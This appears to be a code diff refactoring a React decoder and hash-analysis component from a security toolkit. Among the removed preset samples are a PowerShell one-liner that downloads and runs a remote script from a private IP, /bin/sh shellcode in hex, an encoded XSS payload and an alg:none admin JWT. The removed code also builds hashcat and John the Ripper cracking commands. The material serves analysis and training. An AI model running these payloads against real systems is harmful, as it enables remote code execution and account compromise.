@@ -1,69 +1,38 @@
 import { useState, useMemo, useEffect } from 'react';
 import {
-  Key,
-  Hash,
-  Binary,
+  ArrowRightLeft,
+  ArrowDownUp,
+  Sparkles,
+  Lock,
+  Unlock,
   Copy,
   Check,
   RotateCcw,
-  Sparkles,
-  ArrowRightLeft,
-  ArrowRight,
-  ArrowDownUp,
-  Search,
-  Lock,
-  Unlock,
-  Shield,
-  ShieldAlert,
-  Layers,
   FileCode,
 } from 'lucide-react';
 import {
-  encodeBase64,
-  decodeBase64,
-  encodeHex,
-  decodeHex,
-  encodeURL,
-  decodeURL,
-  encodeHTML,
-  decodeHTML,
-  encodeBinary,
-  decodeBinary,
-  encodeUnicode,
-  decodeUnicode,
-  encodeBase64URL,
-  decodeBase64URL,
-  encodeDecimalASCII,
-  decodeDecimalASCII,
-  caesarShift,
-  reverseString,
-  rot13,
-  xorTransform,
   calculateShannonEntropy,
   calculateHashes,
   identifyHashTypes,
-  type IdentifiedHash,
   parseJWT,
   defang,
   refang,
+  reverseString,
 } from '../../lib/security/transformers';
 import CustomSelect from '../CustomSelect';
+import {
+  DECODER_PRESET_OPTIONS,
+  DECODER_PRESETS,
+} from '../../data/security/decoderRecipes';
+import QuickTransformGrid from './decoder/QuickTransformGrid';
+import JwtInspectorPanel from './decoder/JwtInspectorPanel';
+import HashCalculatorPanel from './decoder/HashCalculatorPanel';
 import styles from './DecoderHub.module.css';
-
-const DECODER_PRESET_OPTIONS = [
-  { value: 'vulnerable_jwt', label: 'JWT (alg:none / Admin Claim)', badge: 'JWT' },
-  { value: 'base64_payload', label: 'PowerShell Base64 Payload', badge: 'Base64' },
-  { value: 'hex_shellcode', label: 'Hex Shellcode (execve /bin/sh)', badge: 'Shellcode' },
-  { value: 'mystery_ntlm', label: 'NTLM Windows Hash Sample', badge: 'NTLM' },
-  { value: 'mystery_bcrypt', label: 'Bcrypt Password Hash Sample', badge: 'Bcrypt' },
-  { value: 'mystery_sha256', label: 'SHA-256 Mystery Hash Sample', badge: 'SHA256' },
-  { value: 'url_encoded_xss', label: 'Double URL Encoded XSS', badge: 'URL' },
-  { value: 'xor_sample', label: 'XOR Obfuscated Hex String', badge: 'XOR' },
-  { value: 'binary_secret', label: '8-Bit Binary Encoded String', badge: 'Binary' },
-];
 
 interface DecoderHubProps {
   initialInput?: string;
+  /** Bumped per dispatch so identical input re-applies instead of being skipped */
+  initialInputNonce?: number;
   onSendToSandbox?: (code: string) => void;
   onSendToAI?: (prompt: string) => void;
 }
@@ -71,20 +40,9 @@ interface DecoderHubProps {
 const DECODER_INPUT_STORAGE_KEY = 'nexus_security_decoder_input';
 const DECODER_OUTPUT_STORAGE_KEY = 'nexus_security_decoder_output';
 
-const DECODER_PRESETS = {
-  vulnerable_jwt: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIFVzZXIiLCJyb2xlIjoiYWRtaW5pc3RyYXRvciIsImlzQWRtaW4iOnRydWUsImlhdCI6MTUxNjIzOTAyMn0.",
-  base64_payload: "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"Invoke-Expression $(New-Object Net.WebClient).DownloadString('http://10.10.14.12/rev.ps1')\"",
-  hex_shellcode: "31c050682f2f7368682f62696e89e3505389e1b00bcd80",
-  mystery_ntlm: "b4b9b02e6f09a9bd760f388b67351e2b",
-  mystery_bcrypt: "$2a$12$R9h/cIPz0gi.URNNX3kh2OPST9/PgBkqquzi.Ss7KIUgO2t0jWMUW",
-  mystery_sha256: "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8",
-  url_encoded_xss: "%253Cscript%253Ealert(document.domain)%253C%252Fscript%253E",
-  xor_sample: "3a3d242720233c3a3b2b",
-  binary_secret: "01000001 01100100 01101101 01101001 01101110 01010000 01100001 01110011 01110011",
-};
-
 export default function DecoderHub({
   initialInput = '',
+  initialInputNonce,
   onSendToSandbox,
   onSendToAI = () => {},
 }: DecoderHubProps) {
@@ -97,6 +55,17 @@ export default function DecoderHub({
     }
   });
 
+  // Sync when parent passes a new initialInput (e.g. "Decode" from chat code block)
+  useEffect(() => {
+    if (initialInput) {
+      setInput(initialInput);
+      setOutput('');
+      setLastAction('');
+    }
+    // initialInputNonce forces re-apply even when initialInput is unchanged
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [initialInput, initialInputNonce]);
+
   const [output, setOutput] = useState(() => {
     try {
       return localStorage.getItem(DECODER_OUTPUT_STORAGE_KEY) || '';
@@ -106,95 +75,66 @@ export default function DecoderHub({
   });
 
   const [lastAction, setLastAction] = useState<string>('');
-  const [xorKey, setXorKey] = useState('0x5A');
-  const [caesarShiftNum, setCaesarShiftNum] = useState(13);
   const [copiedKey, setCopiedKey] = useState<string | null>(null);
-
-  useEffect(() => {
-    if (initialInput) setInput(initialInput);
-  }, [initialInput]);
-
-  useEffect(() => {
-    const handleSecurityEvent = (e: Event) => {
-      const custom = e as CustomEvent<{ tab?: string; input?: string; code?: string }>;
-      if (custom.detail?.tab === 'decoders') {
-        const text = custom.detail.input || custom.detail.code;
-        if (text) setInput(text);
-      }
-    };
-    window.addEventListener('nexus:open-security', handleSecurityEvent);
-    return () => window.removeEventListener('nexus:open-security', handleSecurityEvent);
-  }, []);
 
   useEffect(() => {
     try {
       localStorage.setItem(DECODER_INPUT_STORAGE_KEY, input);
-    } catch (e) {
-      console.error(e);
-    }
-  }, [input]);
-
-  useEffect(() => {
-    try {
       localStorage.setItem(DECODER_OUTPUT_STORAGE_KEY, output);
     } catch (e) {
       console.error(e);
     }
-  }, [output]);
+  }, [input, output]);
 
-  const copyToClipboard = (text: string, key: string) => {
-    navigator.clipboard.writeText(text);
-    setCopiedKey(key);
-    setTimeout(() => setCopiedKey(null), 2000);
+  const entropy = useMemo(() => calculateShannonEntropy(input), [input]);
+  const outputEntropy = useMemo(() => calculateShannonEntropy(output), [output]);
+
+  const entropyAssessment = useMemo(() => {
+    if (entropy === 0) return { label: 'Empty', color: 'slate' };
+    if (entropy < 3.5) return { label: 'Low (Plaintext / Sparse)', color: 'blue' };
+    if (entropy < 5.0) return { label: 'Medium (Code / Structured JSON)', color: 'emerald' };
+    if (entropy < 7.0) return { label: 'High (Base64 / Obfuscated)', color: 'amber' };
+    return { label: 'Very High (Encrypted / Compressed / Shellcode)', color: 'rose' };
+  }, [entropy]);
+
+  const hashes = useMemo(() => calculateHashes(input), [input]);
+  const identifiedHashes = useMemo(() => identifyHashTypes(input.trim()), [input]);
+  const activeJWT = useMemo(() => parseJWT(input) || (output ? parseJWT(output) : null), [input, output]);
+
+  const handleTransform = (actionName: string, transformFn: (text: string) => string) => {
+    try {
+      const res = transformFn(input);
+      setOutput(res);
+      setLastAction(actionName);
+    } catch (err: unknown) {
+      const msg = err instanceof Error ? err.message : String(err);
+      setOutput(`// Error executing ${actionName}:\n// ${msg}`);
+      setLastAction(`Error: ${actionName}`);
+    }
   };
 
-  // Perform Transform (Input -> Output)
-  const handleTransform = (actionName: string, transformFn: (val: string) => string) => {
-    const res = transformFn(input);
-    setOutput(res);
-    setLastAction(actionName);
-  };
-
-  // 2-Way Swap Action (Input <-> Output)
   const handleSwap = () => {
-    const temp = input;
+    const prevInput = input;
     setInput(output);
-    setOutput(temp);
+    setOutput(prevInput);
     setLastAction('Swapped Input ⇄ Output');
   };
 
-  // Use Output as Input (Chain)
   const handleUseOutputAsInput = () => {
     setInput(output);
     setOutput('');
     setLastAction('Piped Output ➔ Input');
   };
 
-  // Analysis Metrics
-  const entropy = useMemo(() => calculateShannonEntropy(input), [input]);
-  const outputEntropy = useMemo(() => calculateShannonEntropy(output), [output]);
-  const hashes = useMemo(() => calculateHashes(input), [input]);
-  const activeJWT = useMemo(() => parseJWT(input) || parseJWT(output), [input, output]);
+  const copyToClipboard = (text: string, key: string) => {
+    navigator.clipboard.writeText(text);
+    setCopiedKey(key);
+    setTimeout(() => setCopiedKey(null), 1500);
+  };
 
-  // Mystery Hash Detection
-  const identifiedInputHashes = useMemo(() => identifyHashTypes(input), [input]);
-  const identifiedOutputHashes = useMemo(() => identifyHashTypes(output), [output]);
-  const activeIdentified = useMemo(() => {
-    return identifiedInputHashes.length > 0 ? identifiedInputHashes : identifiedOutputHashes;
-  }, [identifiedInputHashes, identifiedOutputHashes]);
-
-  const entropyAssessment = useMemo(() => {
-    if (!input) return { label: 'Empty', color: 'badgeInfo' };
-    if (entropy > 7.2) return { label: 'Extremely High (Likely Encrypted/Packed)', color: 'badgeWarning' };
-    if (entropy > 6.0) return { label: 'High (Obfuscated / Binary / Shellcode)', color: 'badgeWarning' };
-    if (entropy > 4.0) return { label: 'Moderate (Standard Code / Text)', color: 'cardBadge' };
-    return { label: 'Low (Structured / Repetitive)', color: 'badgeInfo' };
-  }, [entropy, input]);
-
-  // AI Actions
   const handleAIDeobfuscate = () => {
-    const payloadToAnalyze = input.trim() || output.trim() || DECODER_PRESETS.base64_payload;
-    const prompt = `I am analyzing an obfuscated security artifact / mystery payload in the 2-Way Decoders Hub:
+    const payloadToAnalyze = (input.trim() || output.trim() || DECODER_PRESETS.base64_payload).trim();
+    const prompt = `I am analyzing an obfuscated security payload in the 2-Way Decoders Hub:
 
 \`\`\`
 ${payloadToAnalyze}
@@ -317,9 +257,9 @@ Please provide an in-depth **Hash Identification & Cracking Strategy**:
           </div>
         </div>
 
-        {/* 2-Way Split Panes (Input on Left, Output on Right) */}
+        {/* 2-Way Split Panes */}
         <div className={styles.panesGrid}>
-          {/* Left Pane: Input / Source */}
+          {/* Left Pane: Input */}
           <div className={styles.paneColumn}>
             <div className={styles.paneHeader}>
               <span className={styles.paneTitle}>
@@ -362,7 +302,7 @@ Please provide an in-depth **Hash Identification & Cracking Strategy**:
               spellCheck={false}
             />
 
-            {/* Quick Helper Tools under Input */}
+            {/* Quick Helper Tools */}
             <div className={styles.quickHelpers}>
               <button
                 className={styles.btn}
@@ -388,7 +328,7 @@ Please provide an in-depth **Hash Identification & Cracking Strategy**:
             </div>
           </div>
 
-          {/* Center Swap / Direction Controls */}
+          {/* Center Swap Controls */}
           <div className={styles.centerControls}>
             <button
               className={`${styles.btn} ${styles.btnSwap}`}
@@ -406,7 +346,7 @@ Please provide an in-depth **Hash Identification & Cracking Strategy**:
             </button>
           </div>
 
-          {/* Right Pane: Output / Result */}
+          {/* Right Pane: Output */}
           <div className={styles.paneColumn}>
             <div className={styles.paneHeader}>
               <span className={styles.paneTitle}>
@@ -444,294 +384,26 @@ Please provide an in-depth **Hash Identification & Cracking Strategy**:
             <textarea
               className={`${styles.textarea} ${styles.outputTextarea}`}
               value={output}
-              readOnly
-              placeholder="Transformed result will appear here. Click any Encode or Decode button below..."
+              onChange={(e) => setOutput(e.target.value)}
+              placeholder="Transformed result will appear here. You can also edit this directly before chaining..."
               spellCheck={false}
             />
           </div>
         </div>
 
-        {/* 2-Way Transformation Toolbars Grouped by Format */}
-        <div className={styles.transformsSection}>
-          <div className={styles.sectionHeader}>
-            <Binary size={15} color="#38bdf8" />
-            <span>2-Way Encoders &amp; Decoders</span>
-          </div>
-
-          <div className={styles.transformGrid}>
-            {/* Base64 & Base64URL */}
-            <div className={styles.transformGroup}>
-              <div className={styles.groupLabel}>Base64 &amp; Base64URL</div>
-              <div className={styles.btnPair}>
-                <button className={styles.btn} onClick={() => handleTransform('Base64 Encode', encodeBase64)}>
-                  Encode Base64 <ArrowRight size={11} />
-                </button>
-                <button className={styles.btn} onClick={() => handleTransform('Base64 Decode', decodeBase64)}>
-                  <ArrowRight size={11} /> Decode Base64
-                </button>
-              </div>
-              <div className={styles.btnPair}>
-                <button className={styles.btn} onClick={() => handleTransform('Base64URL Encode', encodeBase64URL)}>
-                  Encode B64URL <ArrowRight size={11} />
-                </button>
-                <button className={styles.btn} onClick={() => handleTransform('Base64URL Decode', decodeBase64URL)}>
-                  <ArrowRight size={11} /> Decode B64URL
-                </button>
-              </div>
-            </div>
-
-            {/* Hex & Binary (8-bit) */}
-            <div className={styles.transformGroup}>
-              <div className={styles.groupLabel}>Hex &amp; Binary</div>
-              <div className={styles.btnPair}>
-                <button className={styles.btn} onClick={() => handleTransform('Hex Encode', encodeHex)}>
-                  Encode Hex <ArrowRight size={11} />
-                </button>
-                <button className={styles.btn} onClick={() => handleTransform('Hex Decode', decodeHex)}>
-                  <ArrowRight size={11} /> Decode Hex
-                </button>
-              </div>
-              <div className={styles.btnPair}>
-                <button className={styles.btn} onClick={() => handleTransform('Binary Encode', encodeBinary)}>
-                  Encode Binary <ArrowRight size={11} />
-                </button>
-                <button className={styles.btn} onClick={() => handleTransform('Binary Decode', decodeBinary)}>
-                  <ArrowRight size={11} /> Decode Binary
-                </button>
-              </div>
-            </div>
-
-            {/* URL, HTML & Unicode */}
-            <div className={styles.transformGroup}>
-              <div className={styles.groupLabel}>URL, HTML &amp; Unicode</div>
-              <div className={styles.btnPair}>
-                <button className={styles.btn} onClick={() => handleTransform('URL Encode', encodeURL)}>
-                  Encode URL <ArrowRight size={11} />
-                </button>
-                <button className={styles.btn} onClick={() => handleTransform('URL Decode', decodeURL)}>
-                  <ArrowRight size={11} /> Decode URL
-                </button>
-              </div>
-              <div className={styles.btnPair}>
-                <button className={styles.btn} onClick={() => handleTransform('HTML Encode', encodeHTML)}>
-                  HTML Entity <ArrowRight size={11} />
-                </button>
-                <button className={styles.btn} onClick={() => handleTransform('HTML Decode', decodeHTML)}>
-                  <ArrowRight size={11} /> Decode HTML
-                </button>
-              </div>
-              <div className={styles.btnPair}>
-                <button className={styles.btn} onClick={() => handleTransform('Unicode Escape', encodeUnicode)}>
-                  \uXXXX Encode <ArrowRight size={11} />
-                </button>
-                <button className={styles.btn} onClick={() => handleTransform('Unicode Decode', decodeUnicode)}>
-                  <ArrowRight size={11} /> Decode \uXXXX
-                </button>
-              </div>
-            </div>
-
-            {/* Ciphers: XOR, Caesar & Rot13 */}
-            <div className={styles.transformGroup}>
-              <div className={styles.groupLabel}>Ciphers &amp; Shifts</div>
-              <div className={styles.btnPair}>
-                <button className={styles.btn} onClick={() => handleTransform('Rot13 Cipher', rot13)}>
-                  Rot13 (+13) <ArrowRight size={11} />
-                </button>
-                <button className={styles.btn} onClick={() => handleTransform(`Caesar Shift (+${caesarShiftNum})`, (val) => caesarShift(val, caesarShiftNum))}>
-                  Shift (+{caesarShiftNum}) <ArrowRight size={11} />
-                </button>
-              </div>
-
-              {/* XOR Shift with Key */}
-              <div className={styles.xorBox}>
-                <span className={styles.xorLabel}>XOR Key:</span>
-                <input
-                  type="text"
-                  className={styles.xorInput}
-                  value={xorKey}
-                  onChange={(e) => setXorKey(e.target.value)}
-                  placeholder="0x5A or secret"
-                />
-                <button
-                  className={`${styles.btn} ${styles.btnPrimary}`}
-                  onClick={() => handleTransform(`XOR (Key: ${xorKey})`, (val) => xorTransform(val, xorKey))}
-                >
-                  Apply XOR
-                </button>
-              </div>
-            </div>
-          </div>
-        </div>
+        {/* 2-Way Transformation Grid */}
+        <QuickTransformGrid onTransform={handleTransform} />
       </div>
 
-      {/* Deep Security Analyzers Grid */}
-      <div className={styles.analyzerGrid}>
-        {/* JWT Inspector Card */}
-        <div className={styles.quickCard}>
-          <div className={styles.cardHeader}>
-            <span className={styles.cardTitle}>
-              <Key size={16} color="#fbbf24" /> JWT Token Inspector
-            </span>
-            <button
-              className={styles.btn}
-              onClick={handleAIJWTAudit}
-              title="Audit JWT for alg:none, key confusion, and privilege escalation"
-            >
-              <Sparkles size={12} /> AI JWT Audit
-            </button>
-          </div>
+      {/* JWT Inspector Panel */}
+      <JwtInspectorPanel jwt={activeJWT} onAuditWithAI={handleAIJWTAudit} />
 
-          {activeJWT ? (
-            <div className={styles.jwtView}>
-              <div style={{ display: 'flex', gap: '0.4rem', flexWrap: 'wrap', alignItems: 'center' }}>
-                <span className={styles.cardBadge}>Algorithm: {activeJWT.algorithm}</span>
-                {activeJWT.isExpired ? (
-                  <span className={`${styles.cardBadge} ${styles.badgeWarning}`}>EXPIRED</span>
-                ) : (
-                  <span className={`${styles.cardBadge} ${styles.cardBadgeGreen}`}>ACTIVE</span>
-                )}
-                {activeJWT.expiresAt && (
-                  <span style={{ fontSize: '0.72rem', color: 'var(--text-muted)' }}>
-                    Exp: {new Date(activeJWT.expiresAt).toLocaleString()}
-                  </span>
-                )}
-              </div>
-
-              {activeJWT.warnings && activeJWT.warnings.length > 0 && (
-                <div className={styles.warningList}>
-                  {activeJWT.warnings.map((w, i) => (
-                    <div key={i} className={styles.warningItem}>
-                      <ShieldAlert size={12} /> {w}
-                    </div>
-                  ))}
-                </div>
-              )}
-
-              <div className={styles.jwtGrid}>
-                <div>
-                  <div className={styles.inputLabel}>Decoded Header</div>
-                  <pre className={styles.jsonBox}>{JSON.stringify(activeJWT.header, null, 2)}</pre>
-                </div>
-                <div>
-                  <div className={styles.inputLabel}>Decoded Payload Claims</div>
-                  <pre className={styles.jsonBox}>{JSON.stringify(activeJWT.payload, null, 2)}</pre>
-                </div>
-              </div>
-            </div>
-          ) : (
-            <div style={{ padding: '1.25rem', textAlign: 'center', color: 'var(--text-muted)', fontSize: '0.8rem' }}>
-              <Key size={24} style={{ opacity: 0.4, marginBottom: '0.4rem' }} />
-              <div>No valid JWT detected in Input or Output.</div>
-              <div style={{ fontSize: '0.74rem', marginTop: '0.2rem' }}>
-                Paste a JWT token above or load the JWT preset example to inspect headers and claims.
-              </div>
-            </div>
-          )}
-        </div>
-
-        {/* Hashes & Hash Identifier Card */}
-        <div className={styles.quickCard}>
-          <div className={styles.cardHeader}>
-            <span className={styles.cardTitle}>
-              <Hash size={16} color="#34d399" /> Hashes &amp; Hash Type Identifier
-            </span>
-            <button
-              className={styles.btn}
-              onClick={handleAIHashAnalysis}
-              title="Threat intelligence and hash cracking commands (Hashcat, John)"
-            >
-              <Sparkles size={12} /> AI Hash Intel &amp; Cracker
-            </button>
-          </div>
-
-          {/* Mystery Hash Identification Display */}
-          {activeIdentified.length > 0 && (
-            <div className={styles.identifiedBox}>
-              <div className={styles.identifiedTitle}>
-                <Search size={13} color="#38bdf8" />
-                <span>Detected Hash Formats ({activeIdentified.length} matches):</span>
-              </div>
-              <div className={styles.identifiedList}>
-                {activeIdentified.map((h, i) => (
-                  <div key={i} className={styles.identifiedItem}>
-                    <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', gap: '0.4rem', flexWrap: 'wrap' }}>
-                      <span style={{ fontWeight: 700, color: '#f8fafc', fontSize: '0.82rem' }}>{h.name}</span>
-                      <span className={styles.cardBadge}>{h.category}</span>
-                    </div>
-                    <div style={{ fontSize: '0.74rem', color: '#94a3b8', marginTop: '0.15rem' }}>
-                      {h.description}
-                    </div>
-                    <div style={{ display: 'flex', gap: '0.4rem', marginTop: '0.35rem', flexWrap: 'wrap' }}>
-                      <button
-                        className={styles.btnMini}
-                        onClick={() => copyToClipboard(`hashcat ${h.hashcatMode} hash.txt rockyou.txt`, `hc_${i}`)}
-                        title="Copy Hashcat command"
-                      >
-                        {copiedKey === `hc_${i}` ? <Check size={10} color="#10b981" /> : <FileCode size={10} />}
-                        <span>Hashcat: <code>{h.hashcatMode}</code></span>
-                      </button>
-                      <button
-                        className={styles.btnMini}
-                        onClick={() => copyToClipboard(`john --format=${h.johnFormat} hash.txt --wordlist=rockyou.txt`, `john_${i}`)}
-                        title="Copy John the Ripper command"
-                      >
-                        {copiedKey === `john_${i}` ? <Check size={10} color="#10b981" /> : <FileCode size={10} />}
-                        <span>John: <code>{h.johnFormat}</code></span>
-                      </button>
-                    </div>
-                  </div>
-                ))}
-              </div>
-            </div>
-          )}
-
-          <div>
-            <div className={styles.inputLabel} style={{ marginTop: activeIdentified.length > 0 ? '0.5rem' : '0' }}>
-              Computed Checksums (for Input)
-            </div>
-            <table className={styles.hashTable}>
-              <tbody>
-                <tr>
-                  <td className={styles.hashLabel}>MD5</td>
-                  <td className={styles.hashVal}>{hashes.md5}</td>
-                  <td style={{ width: '40px', textAlign: 'right' }}>
-                    <button className={styles.btnMini} onClick={() => copyToClipboard(hashes.md5, 'md5')}>
-                      {copiedKey === 'md5' ? <Check size={10} color="#10b981" /> : <Copy size={10} />}
-                    </button>
-                  </td>
-                </tr>
-                <tr>
-                  <td className={styles.hashLabel}>SHA-1</td>
-                  <td className={styles.hashVal}>{hashes.sha1}</td>
-                  <td style={{ width: '40px', textAlign: 'right' }}>
-                    <button className={styles.btnMini} onClick={() => copyToClipboard(hashes.sha1, 'sha1')}>
-                      {copiedKey === 'sha1' ? <Check size={10} color="#10b981" /> : <Copy size={10} />}
-                    </button>
-                  </td>
-                </tr>
-                <tr>
-                  <td className={styles.hashLabel}>SHA-256</td>
-                  <td className={styles.hashVal}>{hashes.sha256}</td>
-                  <td style={{ width: '40px', textAlign: 'right' }}>
-                    <button className={styles.btnMini} onClick={() => copyToClipboard(hashes.sha256, 'sha256')}>
-                      {copiedKey === 'sha256' ? <Check size={10} color="#10b981" /> : <Copy size={10} />}
-                    </button>
-                  </td>
-                </tr>
-                <tr>
-                  <td className={styles.hashLabel}>SHA-512</td>
-                  <td className={styles.hashVal}>{hashes.sha512}</td>
-                  <td style={{ width: '40px', textAlign: 'right' }}>
-                    <button className={styles.btnMini} onClick={() => copyToClipboard(hashes.sha512, 'sha512')}>
-                      {copiedKey === 'sha512' ? <Check size={10} color="#10b981" /> : <Copy size={10} />}
-                    </button>
-                  </td>
-                </tr>
-              </tbody>
-            </table>
-          </div>
-        </div>
-      </div>
+      {/* Hash Calculator & Hash Identifier Panel */}
+      <HashCalculatorPanel
+        hashes={hashes}
+        identifiedHashes={identifiedHashes}
+        onAuditWithAI={handleAIHashAnalysis}
+      />
     </div>
   );
 }
